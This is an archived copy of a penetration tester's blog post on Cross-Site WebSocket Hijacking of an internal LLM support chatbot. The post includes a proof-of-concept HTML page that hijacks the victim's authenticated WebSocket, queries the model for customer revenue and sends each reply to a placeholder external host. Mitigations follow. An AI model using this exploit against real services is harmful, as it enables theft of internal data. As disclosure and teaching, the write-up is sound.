---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-08-05_cswsh-meets-llm-chatbots.md
original_filename: 2024-08-05_cswsh-meets-llm-chatbots.md
title: CSWSH Meets LLM Chatbots
category: documents
detected_topics:
- ssrf
- command-injection
- otp
- automation-abuse
- cors
- csrf
tags:
- imported
- documents
- ssrf
- command-injection
- otp
- automation-abuse
- cors
- csrf
language: en
raw_sha256: 47bc52fc3d33d65d1b640b0ebc2e988e1b7c5fffe03d7f7ad8862b97829ca378
text_sha256: 53aa9f9590bd0c632364476810396796d22fd1116293f2a9f3f54b3f787a997e
ingested_at: '2026-06-28T07:32:36Z'
sensitivity: unknown
redactions_applied: false
---

# CSWSH Meets LLM Chatbots

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-08-05_cswsh-meets-llm-chatbots.md
- Source Type: markdown
- Detected Topics: ssrf, command-injection, otp, automation-abuse, cors, csrf
- Ingested At: 2026-06-28T07:32:36Z
- Redactions Applied: False
- Raw SHA256: `47bc52fc3d33d65d1b640b0ebc2e988e1b7c5fffe03d7f7ad8862b97829ca378`
- Text SHA256: `53aa9f9590bd0c632364476810396796d22fd1116293f2a9f3f54b3f787a997e`


## Content

---
title: "CSWSH Meets LLM Chatbots"
page_title: "CSWSH Meets LLM Chatbot. Taking Over LLMs the WebSocket Way | by Sachin Sharma | InfoSec Write-ups"
url: "https://medium.com/@r3vsh/cswsh-meets-llm-chatbots-3ab09af5ab6f"
authors: ["Sachin Sharma"]
bugs: ["LLM", "Chatbot", "Websockets", "Cross-Site WebSocket Hijacking (CSWH)"]
publication_date: "2024-08-05"
added_date: "2024-08-06"
source: "pentester.land/writeups.json"
original_index: 104
scraped_via: "browseros"
---

# CSWSH Meets LLM Chatbots

CSWSH Meets LLM Chatbot
Sachin Sharma
Follow
4 min read
·
Aug 5, 2024

124

Taking Over LLMs the WebSocket Way

Press enter or click to view image in full size
Initial Thoughts

During a pentest engagement in unfamiliar domains, it’s always reassuring to discover a vulnerability tied to the broader application configuration rather than just the specific pentesting focus. This can reveal deeper issues and provide valuable insights into the overall security posture.

Get Sachin Sharma’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I recently conducted a pentest on a chatbot designed for support staff to use for internal queries. The backend used Claude Anthropic for querying, which was the primary focus of the pentest. While we’ll cover the LLM findings in a separate blog, this post addresses a Cross-Site WebSocket Hijacking (CSWSH) vulnerability. The chatbot communicated with Claude via WebSockets.

CSRF === CSWSH?

CSWSH occurs when a vulnerable WebSocket endpoint allows an attacker to hijack WebSocket connections. For example, an attacker could impersonate a legitimate user and perform actions on their behalf. Wait, this sounds familiar. Is CSWSH just a fancy term for CSRF in the context of WebSockets? The answer is both yes and no. Yes, it is essentially a CSRF attack targeting WebSocket protocols. However, unlike regular CSRF, cross-site WebSocket hijacking allows an attacker to have a two-way interaction with the vulnerable application over the hijacked WebSocket. If the application sends sensitive data to the user through server-generated WebSocket messages, the attacker can intercept and capture this data. Or like in our case, “exfiltrate” the data out of the intended internal network potentially breaching the sensitive information that is queried through the chatbot. Easy and interesting right?

Exploiting a CSWSH
Attempt to initiate a WebSocket handshake with a random value in the ‘Origin’ header. If no errors are returned, and a status code 101 is received, the handshake was successful.
Press enter or click to view image in full size
Checking Origin header validation

2. Additionally, I observed that the cookie responsible for establishing WebSocket handshakes ‘id_token’ has the ‘SameSite’ attribute set to None. This setting permits the chaining of exploits.

Press enter or click to view image in full size
Observe “None” value for “SameSite”

3. Created an exploit based on the WebSocket communication method. This code initiates a WebSocket connection on behalf of the victim, sends a query, and exfiltrates the response from the LLM model back to the attacker (Thanks to my teammate for hosting a quick External Instance). Since there were no validation checks on ‘sessionId’ and ‘queryId’, these values can be set arbitrarily. These were used to keep track of queries at the backend, not interesting.

<html>
<head>
<script>
function test() {
var ws = new WebSocket('wss://websocket.redacted.com');
ws.onopen = function() {
ws.send("{\"mode\":\"doesnt_matter\",\"sessionId\":\"e7b6a0c4-d06c-4f5e-b091-14d53c8f0342\",\"prompt\":\"What is the revenue for Customer ABC?\",\"queryId\":\"cfbff0d1-9375-5685-968c-48ce8b15ae17\"}");
};
ws.onmessage = function(event) {
fetch('http://<external_instance_address>/?exfil='+btoa(event.data), {method: 'GET', mode: 'no-cors'});
};
}
</script>
</head>
<title> POC CSWSH </title>
<body>
Click here <button onclick="test()"> HERE </button>
</body>
</html> 

4. Host the HTML page on a server, using a simple Python HTTP server on localhost for testing purposes.

Press enter or click to view image in full size
Hosted on local machine for POC

5. Open the page in a victim’s browser where an authenticated session is active. Click the button. This is a proof-of-concept (PoC); in a real scenario, an attacker could send such pages through support staff chatbots, which use the same WebSocket communication structure as internal staff queries to the LLM.

Press enter or click to view image in full size
Accessing the exploit page

6. Monitor the interaction on the external instance. These interactions are responses from the hijacked WebSocket that have been infiltrated. An attacker can exfiltrate any internal data that the LLM has access to!

Press enter or click to view image in full size
Exfiltration of data

7. Here is the response from the LLM model for the prompt included in the exploit code.

Press enter or click to view image in full size
ANY data can be exfiltrated

Mitigations:

- Validate the “Origin” value when a WebSocket handshake is initiated.
- The value of the SameSite attribute in the “id_token” cookie should be set to Strict or Lax, as per requirement.
- The “queryId” and “sessionId” should have validation in place that prevents accepting of any predictable pattern.
- Use CSRF tokens in WebSocket handshakes if necessary.
